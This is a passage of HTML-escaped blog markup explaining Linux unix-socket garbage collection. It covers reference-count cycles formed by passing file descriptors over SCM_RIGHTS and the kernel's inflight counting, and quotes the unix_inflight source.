class=\"ykcrMYlEiJ-c2\"&gt;.&lt;/span&gt;&lt;/li&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c12 c20 c25 li-bullet-0\"&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;B&lt;/span&gt;&lt;span&gt;&amp;nbsp;sends socket &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;B&lt;/span&gt;&lt;span&gt;&amp;nbsp;to socket &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;A&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;.&lt;/span&gt;&lt;/li&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c12 c20 c25 li-bullet-0\"&gt;&lt;span&gt;Close &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;A&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;.&lt;/span&gt;&lt;/li&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c12 c20 c25 li-bullet-0\"&gt;&lt;span&gt;Close &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;B&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;.&lt;/span&gt;&lt;/li&gt;&lt;/ol&gt;\n &lt;p class=\"c31 c20 c48\"&gt;&lt;/p&gt;\n &lt;p class=\"c31 c20 c48\"&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;&lt;a href=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEixn2j2I0_3XKxc7uimc_-Bd2F7fUflziTRwXRLeCfzDzrA_GKDsDLvqidYluwq_lGptlzWkZ3DD4f2DGnyjuALHuH46yzHjovkrVdzuG-Ncgi4WphgXf9HK_RPnxB91R07fG7cnyy4wZN-M3qZtb6uKOwarRmxIPdQWbJVA-KQlhKQBBR4EZS6aZDe/s724/image66.png\" style=\"display: block; padding: 1em 0;text-align: center;\"&gt;&lt;img src=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEixn2j2I0_3XKxc7uimc_-Bd2F7fUflziTRwXRLeCfzDzrA_GKDsDLvqidYluwq_lGptlzWkZ3DD4f2DGnyjuALHuH46yzHjovkrVdzuG-Ncgi4WphgXf9HK_RPnxB91R07fG7cnyy4wZN-M3qZtb6uKOwarRmxIPdQWbJVA-KQlhKQBBR4EZS6aZDe/s724/image66.png\" border=\"0\" alt=\"Socket A and B form a reference count cycle.\" style=\"max-height: 750px; max-width: 600px;\"title=\"Socket A and B form a reference count cycle.\" /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c20 ykcrMYlEiJ-c31\"&gt;&lt;span class=\"c34 c19 c32\"&gt;Scenario for reference count cycle&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c5\"&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12 ykcrMYlEiJ-c20\"&gt;&lt;span&gt;Both sockets are closed prior to accepting the passed file descriptors.The reference counts of &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;A&lt;/span&gt;&lt;span&gt;&amp;nbsp;and &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;B&lt;/span&gt;&lt;span&gt;&amp;nbsp;are both 1 and can&amp;#39;t be further decremented because they were removed from the kernel fd table when the respective processes closed them. Therefore the kernel is unable to release the two skbs and sock structures &lt;/span&gt;&lt;span&gt;and an unbreakable cycle is formed&lt;/span&gt;&lt;span&gt;. The Linux kernel garbage collection system is designed to prevent memory exhaustion in this particular scenario. The &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c3\"&gt;inflight&lt;/span&gt;&lt;span&gt;&amp;nbsp;count was implemented to identify potential garbage. Each time the reference count is increased due to an SCM_RIGHTS datagram being sent, the &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c3\"&gt;inflight&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;&amp;nbsp;count will also be incremented.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c5\"&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12 ykcrMYlEiJ-c20\"&gt;&lt;span&gt;When a file descriptor is sent by &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c3\"&gt;SCM_RIGHTS&lt;/span&gt;&lt;span&gt;&amp;nbsp;datagram,&lt;/span&gt;&lt;span&gt;&amp;nbsp;the Linux kernel puts its &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c3\"&gt;unix_sock&lt;/span&gt;&lt;span&gt;&amp;nbsp;into a global list &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c3\"&gt;gc_inflight_list&lt;/span&gt;&lt;span&gt;. The kernel&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;increments &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c3\"&gt;unix_tot_inflight&lt;/span&gt;&lt;span&gt;&amp;nbsp;which counts the total number of inflight sockets. Then, the kernel increments &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c3\"&gt;u-&amp;gt;inflight&lt;/span&gt;&lt;span&gt;&amp;nbsp;which tracks the inflight count for each individual file descriptor in the &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c3\"&gt;unix_inflight&lt;/span&gt;&lt;span&gt;&amp;nbsp;function (&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c9\"&gt;&lt;a class=\"ykcrMYlEiJ-c261\" href=\"https://elixir.bootlin.com/linux/v4.14.277/source/net/unix/scm.c#L45\"&gt;scm.c#L45&lt;/a&gt;&lt;/span&gt;&lt;span&gt;) invoked from &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c3\"&gt;unix_attach_fds&lt;/span&gt;&lt;span&gt;:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c5\"&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=\"t.029ba7ef27b97405e8e6fdfbd115b01f42a3bdd9\"&gt;&lt;/a&gt;&lt;a id=\"t.7\"&gt;&lt;/a&gt;&lt;table class=\"ykcrMYlEiJ-c33\"&gt;&lt;tr class=\"ykcrMYlEiJ-c17\"&gt;&lt;td class=\"ykcrMYlEiJ-c18\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c14\"&gt;void&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp;unix_inflight&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;(&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c14\"&gt;struct&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp;user_struct &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;*&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;user&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;,&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c14\"&gt;struct&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp;file &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;*&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;fp&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;)&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c14\"&gt;struct&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp;sock &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;*&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;s &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;=&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp;unix_get_socket&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;(&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;fp&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12 ykcrMYlEiJ-c29\"&gt;&lt;span class=\"ykcrMYlEiJ-c0 ykcrMYlEiJ-c13\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; spin_lock&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;(&amp;amp;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;unix_gc_lock&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12 ykcrMYlEiJ-c29\"&gt;&lt;span class=\"ykcrMYlEiJ-c0 ykcrMYlEiJ-c13\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c14\"&gt;if&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;(&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;s&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;)&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c14\"&gt;struct&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp;unix_sock &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;*&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;u &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;=&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp;unix_sk&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;(&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;s&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12 ykcrMYlEiJ-c29\"&gt;&lt;span class=\"ykcrMYlEiJ-c0 ykcrMYlEiJ-c13\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c0 ykcrMYlEiJ-c7\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c14 ykcrMYlEiJ-c7\"&gt;if&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0 ykcrMYlEiJ-c7\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10 ykcrMYlEiJ-c7\"&gt;(&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0 ykcrMYlEiJ-c7\"&gt;atomic_long_inc_return&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10 ykcrMYlEiJ-c7\"&gt;(&amp;amp;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0 ykcrMYlEiJ-c7\"&gt;u&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10 ykcrMYlEiJ-c7\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0 ykcrMYlEiJ-c7\"&gt;inflight&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10 ykcrMYlEiJ-c7\"&gt;)&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0 ykcrMYlEiJ-c7\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10 ykcrMYlEiJ-c7\"&gt;==&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0 ykcrMYlEiJ-c7\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c35 ykcrMYlEiJ-c7\"&gt;1&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10 ykcrMYlEiJ-c7\"&gt;)&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0 ykcrMYlEiJ-c7\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10 ykcrMYlEiJ-c7\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; BUG_ON&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;(!&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;list_empty&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;(&amp;amp;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;u&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;link&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;));&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c0 ykcrMYlEiJ-c7\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; list_add_tail&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10 ykcrMYlEiJ-c7\"&gt;(&amp;amp;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0 ykcrMYlEiJ-c7\"&gt;u&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10 ykcrMYlEiJ-c7\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0 ykcrMYlEiJ-c7\"&gt;link&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10 ykcrMYlEiJ-c7\"&gt;,&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0 ykcrMYlEiJ-c7\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10 ykcrMYlEiJ-c7\"&gt;&amp;amp;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0 ykcrMYlEiJ-c7\"&gt;gc_inflight_list&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10 ykcrMYlEiJ-c7\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;}&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c14\"&gt;else&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; BUG_ON&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;(&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;list_empty&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;(&amp;amp;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;u&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;link&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;));&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;}&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c0 ykcrMYlEiJ-c7\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; unix_tot_inflight&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10 ykcrMYlEiJ-c7\"&gt;++;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;}&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c0 ykcrMYlEiJ-c7\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; user&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10 ykcrMYlEiJ-c7\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0 ykcrMYlEiJ-c7\"&gt;unix_inflight&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10 ykcrMYlEiJ-c7\"&gt;++;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; spin_unlock&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;(&amp;amp;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;unix_gc_lock&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;}&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;\n &lt;p class=\"ykcrMYlEiJ-c5\"&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12 ykcrMYlEiJ-c20\"&gt;&lt;span&gt;Thus, here is what the &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c3\"&gt;sk_buff&lt;/span&gt;&lt;span&gt;&amp;nbsp;looks like when transferring a file descriptor within sockets &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;A&lt;/span&gt;&lt;span&gt;&amp;nbsp;and &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;B&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c31 ykcrMYlEiJ-c20\"&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c31 ykcrMYlEiJ-c20\"&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;&lt;a href=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg7JYdav9RAoJLT1TJAAfsVJ6kudGtVBqb8V8Xs0DjEVDEfouQv3SX06oh4AmpRx8UrMNnjqhe0i0FYB6c2jjNtiwGSa1LpHSsg-0AI270tzyX2ziVEHuOO69qTIYhjj780S0oMvXfrdAuyNImJYtBfZ8oUV869w62NV5wshFX3cM0hpmPW219HZT3u/s756/image64.png\" style=\"display: block; padding: 1em 0;text-align: center;\"&gt;&lt;img src=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg7JYdav9RAoJLT1TJAAfsVJ6kudGtVBqb8V8Xs0DjEVDEfouQv3SX06oh4AmpRx8UrMNnjqhe0i0FYB6c2jjNtiwGSa1LpHSsg-0AI270tzyX2ziVEHuOO69qTIYhjj780S0oMvXfrdAuyNImJYtBfZ8oUV869w62NV5wshFX3cM0hpmPW219HZT3u/s756/image64.png\" border=\"0\" alt=\"When the file descriptor A sends itself to the file descriptor B, the reference count of the file descriptor A is 2 and the inflight count is 1. For the receiver file descriptor B, the file reference count is 1 and the inflight count is 0.\" style=\"max-height: 750px; max-width: 600px;\"title=\"When the file descriptor A sends itself to the file descriptor B, the reference count of the file descriptor A is 2 and the inflight count is 1. For the receiver file descriptor B, the file reference count is 1 and the inflight count is 0.\" /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c31 ykcrMYlEiJ-c20\"&gt;&lt;span class=\"ykcrMYlEiJ-c32\"&gt;The inflight count of &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;A&lt;/span&gt;&lt;span class=\"c34 c19 c32\"&gt;&amp;nbsp;is incremented&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12 ykcrMYlEiJ-c20\"&gt;&lt;span&gt;When the socket file descriptor is received from the other side, the &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c3\"&gt;unix_sock.inflight&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;&amp;nbsp;count will be decremented.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c5\"&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12 ykcrMYlEiJ-c20\"&gt;&lt;span&gt;Let&amp;rsquo;s revisit the reference count cycle scenario before the close syscall. &lt;/span&gt;&lt;span&gt;This cycle is breakable because any socket files can receive the transmitted file and break the reference cycle:&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c32\"&gt;&amp;nbsp;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c31 c20 c48\"&gt;&lt;/p&gt;\n &lt;p class=\"c31 c20 c48\"&gt;&lt;span&gt;&lt;a href=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgXASWOd1HPgwueBa5J636vqpj3uP4onThAwMEL0K_ZBBh3mUr5WklN_YPLIYzXaKl2aSpzcf_odw0ymXe-k7wewgh592dQfkj8AYn6r4jHVh6TXpML2-zsCyFt6ZjmR8N-hcyCeHIwVDjtgCGuRU-YfulCdMk5GWTu9h7X8N7iuCV7GXkzLOKEwFy9/s704/image70.png\" style=\"display: block; padding: 1em 0;text-align: center;\"&gt;&lt;img src=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgXASWOd1HPgwueBa5J636vqpj3uP4onThAwMEL0K_ZBBh3mUr5WklN_YPLIYzXaKl2aSpzcf_odw0ymXe-k7wewgh592dQfkj8AYn6r4jHVh6TXpML2-zsCyFt6ZjmR8N-hcyCeHIwVDjtgCGuRU-YfulCdMk5GWTu9h7X8N7iuCV7GXkzLOKEwFy9/s704/image70.png\" border=\"0\" alt=\"The file descriptor A sends itself to the file descriptor B and vice versa. The inflight count of the file descriptor A and B is both 1 and the file reference count is both 2.\" style=\"max-height: 750px; max-width: 600px;\"title=\"The file descriptor A sends itself to the file descriptor B and vice versa. The inflight count of the file descriptor A and B is both 1 and the file reference count is both 2.\" /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c31 ykcrMYlEiJ-c20\"&gt;&lt;span class=\"ykcrMYlEiJ-c32\"&gt;Breakable cycle before close &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;A&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c32\"&gt;&amp;nbsp;and &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;B&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12 ykcrMYlEiJ-c20\"&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;After closing both of the file descriptors, the reference count equals the inflight count for each of the socket file descriptors, which is a sign of possible garbage:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c31 ykcrMYlEiJ-c20\"&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c31 ykcrMYlEiJ-c20\"&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;&lt;a href=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhiLYC-jGxNwF2UbjAZgIsusMaCUGbBo61ZVRxLljS27iXShVhfCth-_lXBBevW9hyWaIcKBWdkX_6BixTMWNDoE56ZrUFbiKLolrc8orEqPTp_0ITjwRfxUzJZwvaJZWkomMlkM-_Lqr1DdFQVKjnEW_nnuSOz51JCvu-xZDterJudPenVekqGpqP-/s700/image61.png\" style=\"display: block; padding: 1em 0;text-align: center;\"&gt;&lt;img src=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhiLYC-jGxNwF2UbjAZgIsusMaCUGbBo61ZVRxLljS27iXShVhfCth-_lXBBevW9hyWaIcKBWdkX_6BixTMWNDoE56ZrUFbiKLolrc8orEqPTp_0ITjwRfxUzJZwvaJZWkomMlkM-_Lqr1DdFQVKjnEW_nnuSOz51JCvu-xZDterJudPenVekqGpqP-/s700/image61.png\" border=\"0\" alt=\"The cycle becomes unbreakable after closing A and B. The reference count equals to the inflight count for A and B.\" style=\"max-height: 750px; max-width: 600px;\"title=\"The cycle becomes unbreakable after closing A and B. The reference count equals to the inflight count for A and B.\" /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c31 ykcrMYlEiJ-c20\"&gt;&lt;span class=\"ykcrMYlEiJ-c32\"&gt;Unbreakable cycle after close &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;A&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c32\"&gt;&amp;nbsp;and &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;B&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12 ykcrMYlEiJ-c20\"&gt;&lt;span&gt;Now, let&amp;rsquo;s check another example. &lt;/span&gt;&lt;span&gt;Assume we have sockets &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;A&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;B&lt;/span&gt;&lt;span&gt;&amp;nbsp;and &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c44\"&gt;&amp;#x1d6fc;&lt;/span&gt;&lt;span&gt;:&lt;/span&gt;&lt;/p&gt;&lt;ol class=\"c27 lst-kix_9prd8pa3o8y7-0 start\" start=\"1\"&gt;&lt;li style=\"margin-left: 46pt;\" 